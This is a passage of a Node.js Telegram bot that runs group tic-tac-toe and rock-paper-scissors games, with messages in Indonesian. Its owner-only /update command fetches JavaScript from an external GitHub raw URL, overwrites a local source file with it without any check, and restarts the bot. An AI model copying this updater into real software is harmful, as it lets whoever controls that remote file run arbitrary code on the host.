    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]);
    const g = tttGames.get(chatId);
    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Gak ada game", { show_alert: true });
    if (g.players.O) return ctx.answerCbQuery("⚠️ Slot penuh", { show_alert: true });
    if (g.players.X.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu udah X", { show_alert: true });
    g.players.O = ctx.from; g.started = true;
    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board) });
    return ctx.answerCbQuery("✅ Join");
  } catch { return ctx.answerCbQuery("❌ Error"); }
});
bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]); const idx = Number(ctx.match[3]);
    const g = tttGames.get(chatId);
    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Gak ada", { show_alert: true });
    if (!g.started) return ctx.answerCbQuery("⚠️ Belum mulai", { show_alert: true });
    const cur = g.turn === "X" ? g.players.X : g.players.O;
    if (!cur || cur.id !== ctx.from.id) return ctx.answerCbQuery("❌ Bukan giliranmu", { show_alert: true });
    if (g.board[idx] !== null) return ctx.answerCbQuery("⚠️ Terisi", { show_alert: true });
    g.board[idx] = g.turn;
    const w = tttWinner(g.board);
    if (w) {
      const wUser = w === "X" ? g.players.X : g.players.O;
      const lUser = w === "X" ? g.players.O : g.players.X;
      addWin(wUser); addLose(lUser);
      await ctx.editMessageText(`🏆 <b>MENANG: ${tttName(wUser)}</b>\n⭐ +3 point`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board, true) });
      tttGames.delete(chatId);
      return ctx.answerCbQuery("🏆 Selesai");
    }
    if (tttDraw(g.board)) {
      addDraw(g.players.X); addDraw(g.players.O);
      await ctx.editMessageText(`🤝 <b>SERI</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board, true) });
      tttGames.delete(chatId);
      return ctx.answerCbQuery("🤝");
    }
    g.turn = g.turn === "X" ? "O" : "X";
    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board) });
    return ctx.answerCbQuery("✅ Ok");
  } catch { return ctx.answerCbQuery("❌ Error"); }
});
bot.action(/^tttnoop_(.+)_(.+)$/, async (ctx) => ctx.answerCbQuery("⚠️ Selesai"));

// =====================================================
// ============ SUIT ===================================
// =====================================================
const suitGames = new Map();
const suitName = (u) => (u?.username ? `@${u.username}` : u?.first_name || "User");
const suitLabel = (c) => (c === "rock" ? "🪨 Batu" : c === "paper" ? "📄 Kertas" : c === "scissors" ? "✂️ Gunting" : "-");
function suitWin(a, b) {
  if (a === b) return "draw";
  if ((a === "rock" && b === "scissors") || (a === "paper" && b === "rock") || (a === "scissors" && b === "paper")) return "p1";
  return "p2";
}
const suitKbd = (chatId, gid) => ({
  inline_keyboard: [[
    { text: "🪨 Batu", callback_data: `suitpick_${chatId}_${gid}_rock` },
    { text: "📄 Kertas", callback_data: `suitpick_${chatId}_${gid}_paper` },
    { text: "✂️ Gunting", callback_data: `suitpick_${chatId}_${gid}_scissors` },
  ]],
});
bot.command("suit", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) return ctx.reply("❌ Cuma di grup.");
  const chatId = ctx.chat.id;
  if (suitGames.has(chatId)) return ctx.reply("⚠️ Masih ada game.");
  const gid = Date.now().toString().slice(-6);
  suitGames.set(chatId, { id: gid, p1: ctx.from, p2: null, p1Choice: null, p2Choice: null, started: false });
  await ctx.reply(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(ctx.from)}</b>\n👤 P2 : <b>Belum join</b>`, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{ text: "Join Suit", callback_data: `suitjoin_${chatId}_${gid}` }]] },
  });
});
bot.command("suitstop", async (ctx) => {
  if (!suitGames.has(ctx.chat.id)) return ctx.reply("❌ Gak ada game.");
  suitGames.delete(ctx.chat.id);
  ctx.reply("🛑 Game dibatalkan.");
});
bot.action(/^suitjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]);
    const g = suitGames.get(chatId);
    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Gak ada", { show_alert: true });
    if (g.p2) return ctx.answerCbQuery("⚠️ Penuh", { show_alert: true });
    if (g.p1.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu udah P1", { show_alert: true });
    g.p2 = ctx.from; g.started = true;
    await ctx.editMessageText(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(g.p1)}</b>\n👤 P2 : <b>${suitName(g.p2)}</b>\n\nPilih:`, { parse_mode: "HTML", reply_markup: suitKbd(chatId, gid) });
    return ctx.answerCbQuery("✅ Join");
  } catch { return ctx.answerCbQuery("❌ Error"); }
});
bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]); const choice = String(ctx.match[3]);
    const g = suitGames.get(chatId);
    if (!g || g.id !== gid) return ctx.answerCbQuery("❌", { show_alert: true });
    if (!g.started || !g.p2) return ctx.answerCbQuery("⚠️ Belum siap", { show_alert: true });
    if (ctx.from.id === g.p1.id) {
      if (g.p1Choice) return ctx.answerCbQuery("⚠️ Udah milih", { show_alert: true });
      g.p1Choice = choice;
      await ctx.answerCbQuery(`✅ ${suitLabel(choice)}`, { show_alert: true });
    } else if (ctx.from.id === g.p2.id) {
      if (g.p2Choice) return ctx.answerCbQuery("⚠️ Udah milih", { show_alert: true });
      g.p2Choice = choice;
      await ctx.answerCbQuery(`✅ ${suitLabel(choice)}`, { show_alert: true });
    } else return ctx.answerCbQuery("❌ Bukan pemain", { show_alert: true });
    if (!g.p1Choice || !g.p2Choice) return;
    const res = suitWin(g.p1Choice, g.p2Choice);
    if (res === "draw") {
      addSuitDraw(g.p1); addSuitDraw(g.p2);
      await ctx.editMessageText(`🤝 <b>SERI</b>`, { parse_mode: "HTML" });
      suitGames.delete(chatId);
      return;
    }
    const winner = res === "p1" ? g.p1 : g.p2;
    const loser = res === "p1" ? g.p2 : g.p1;
    addSuitWin(winner); addSuitLose(loser);
    await ctx.editMessageText(`🏆 <b>MENANG: ${suitName(winner)}</b>\n⭐ +2 point`, { parse_mode: "HTML" });
    suitGames.delete(chatId);
  } catch { return ctx.answerCbQuery("❌ Error"); }
});

// =====================================================
// ============ AUTO UPDATE ============================
// =====================================================
const UPDATE_URL       = "https://raw.githubusercontent.com/sanz-max/seraphineupdate/main/files.js";
const UPDATE_FILE_PATH = "./files.js";
const BACKUP_FILE_PATH = "./files.backup.js";

bot.command("update", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ Khusus owner.");
  const chatId = ctx.chat.id;
  const sent = await ctx.telegram.sendMessage(chatId, "⏳ Update...");
  const updateProgress = async (percent, status) => {
    const filled = Math.floor(percent / 10);
    const bar = "█".repeat(filled) + "░".repeat(10 - filled);
    await ctx.telegram.editMessageText(chatId, sent.message_id, null, `⏳ [${bar}] ${percent}%\n${status}`, {}).catch(() => {});
  };
  try {
    await updateProgress(20, "Preparing..."); await sleep(500);
    await updateProgress(40, "Downloading...");
    const { data } = await axios.get(UPDATE_URL);
    if (!data) { await updateProgress(40, "❌ Empty!"); return ctx.reply("❌ Failed!"); }
    await updateProgress(60, "Backup..."); await sleep(500);
    if (fs.existsSync(UPDATE_FILE_PATH)) fs.copyFileSync(UPDATE_FILE_PATH, BACKUP_FILE_PATH);
    await updateProgress(80, "Install..."); await sleep(500);
    fs.writeFileSync(UPDATE_FILE_PATH, data);
    await updateProgress(100, "Done");
    await sleep(800);
    await ctx.reply(`✅ Update Successful! Restarting...`);
    setTimeout(() => process.exit(), 2000);
  } catch (e) {
    await ctx.reply(`❌ Update failed: ${e.message}`);
  }
});

// =====================================================
// ============ LAUNCH =================================
// =====================================================
bot.launch();
console.log(chalk.green("🚀 Bot Hefaistos Hades v2 aktif!"));